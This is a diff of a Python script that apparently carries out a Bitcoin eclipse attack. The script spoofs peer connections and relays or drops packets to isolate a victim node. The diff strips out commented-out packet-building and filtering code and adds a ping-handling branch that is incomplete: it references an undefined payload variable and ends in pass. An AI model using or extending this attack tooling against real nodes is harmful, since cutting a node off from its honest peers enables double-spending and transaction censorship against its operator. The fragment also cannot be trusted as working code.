@@ -168,62 +168,6 @@ def make_fake_connection(src_ip, dst_ip):
 	except:
 		print('Error: unable to  start thread to sniff interface {spoof_interface}')
 
-"""
-def custom_packet(msgtype, src_ip, dst_ip, src_port, dst_port):
-	msg = None
-	if msgtype == 'addr':
-		msg = msg_addr(bitcoin_protocolversion)
-	elif msgtype == 'inv':
-		msg = msg_inv(bitcoin_protocolversion)
-	elif msgtype == 'getdata':
-		msg = msg_getdata(bitcoin_protocolversion)
-	#elif msgtype == 'merkleblock':
-	#	msg = msg_merkleblock(bitcoin_protocolversion)
-	elif msgtype == 'getblocks':
-		msg = msg_getblocks(bitcoin_protocolversion)
-	elif msgtype == 'getheaders':
-		msg = msg_getheaders(bitcoin_protocolversion)
-	elif msgtype == 'tx':
-		msg = msg_tx(bitcoin_protocolversion)
-	elif msgtype == 'headers':
-		msg = msg_headers(bitcoin_protocolversion)
-	elif msgtype == 'block':
-		msg = msg_block(bitcoin_protocolversion)
-	elif msgtype == 'getaddr':
-		msg = msg_getaddr(bitcoin_protocolversion)
-	elif msgtype == 'mempool':
-		msg = msg_mempool(bitcoin_protocolversion)
-	elif msgtype == 'ping':
-		msg = msg_ping(bitcoin_protocolversion)
-	elif msgtype == 'pong':
-		msg = msg_pong(bitcoin_protocolversion)
-	#elif msgtype == 'notfound':
-	#	msg = msg_notfound(bitcoin_protocolversion)
-	#elif msgtype == 'filterload':
-	#	msg = msg_filterload(bitcoin_protocolversion)
-	#elif msgtype == 'filteradd':
-	#	msg = msg_filteradd(bitcoin_protocolversion)
-	#elif msgtype == 'filterclear':
-	#	msg = msg_filterclear(bitcoin_protocolversion)
-	#elif msgtype == 'sendheaders':
-	#	msg = msg_sendheaders(bitcoin_protocolversion)
-	#elif msgtype == 'feefilter':
-	#	msg = msg_feefilter(bitcoin_protocolversion)
-	#elif msgtype == 'sendcmpct':
-	#	msg = msg_sendcmpct(bitcoin_protocolversion)
-	#elif msgtype == 'cmpctblock':
-	#	msg = msg_cmpctblock(bitcoin_protocolversion)
-	#elif msgtype == 'getblocktxn':
-	#	msg = msg_getblocktxn(bitcoin_protocolversion)
-	#elif msgtype == 'blocktxn':
-	#	msg = msg_blocktxn(bitcoin_protocolversion)
-	#elif msgtype == 'reject':
-	#	msg = msg_reject()
-	else:
-		return None
-	return msg
-"""
-
 # Called when a packet is sniffed from the network
 def packet_received(packet):
 	try:
@@ -233,21 +177,18 @@ def packet_received(packet):
 	except:
 		return
 
-	# Filter out sources that are not the victim
-	#if packet[IP].src != victim_ip:
-	#	return
-	# Filter out destinations that are not a spoofed IP
-	#if not packet[IP].dst in unprocessed_IPs:
-	#	return
-
-	#packet.show()
-	#packet.show2()
-
 	# Extract the message type
 	msgtype = packet.load[4:16].decode()
 	print(f'src={packet[IP].src}, dst={packet[IP].dst}, msg={msgtype}')
 
 	# Relay Bitcoin packets that aren't from the victim
+	if packet[IP].dst == attacker_ip and packet[IP].src == victim_ip:
+		if msgtype == 'ping':
+			msg = from_bytes(bytes(payload))
+			print(msg)
+			print(type(msg))
+			# send pong
+			pass
 	if packet[IP].dst == attacker_ip and packet[IP].src != victim_ip:
 		if len(spoof_IP_sockets) > 0:
 			if random.random() > eclipse_packet_drop_rate:
@@ -280,13 +221,6 @@ def packet_received(packet):
 					make_fake_connection(random_ip(), victim_ip)
 					sys.exit()
 
-
-	if msgtype == 'verack':
-		# Successful connection! Move from pending to successful
-		pass
-	elif msgtype == 'ping':
-		# send pong
-		pass
 
 def initialize_network_info():
 	global network_interface, broadcast_address
